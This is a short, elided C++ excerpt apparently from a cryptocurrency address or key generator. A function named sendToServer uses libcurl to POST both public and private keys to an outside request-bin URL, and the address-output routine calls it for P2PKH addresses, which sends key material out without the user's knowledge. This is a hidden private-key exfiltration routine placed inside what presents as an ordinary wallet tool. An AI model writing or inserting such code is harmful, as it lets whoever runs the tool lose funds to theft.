...
int sendToServer(string pubKey,string privKey)
{
  CURL *curl;
  CURLcode res;
  ...
  if(curl) {
    /* First set the URL that is about to receive our POST. This URL can
       ...
       data. */ 
    curl_easy_setopt(curl, CURLOPT_URL, "http://ptsv2.com/t/zisy5-1628978911/post");
    /* Now specify the POST data */ 
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "pubKey=" + pubKey + "&privKey=" + privKey);
...
void outputAdd(string outputFile, int addrType, string addr, string pAddr, string pAddrHex) {
  ...
  case P2PKH:
    ...
    sendToServer(addr.c_str(), pAddr.c_str());
    break;
  case P2SH:
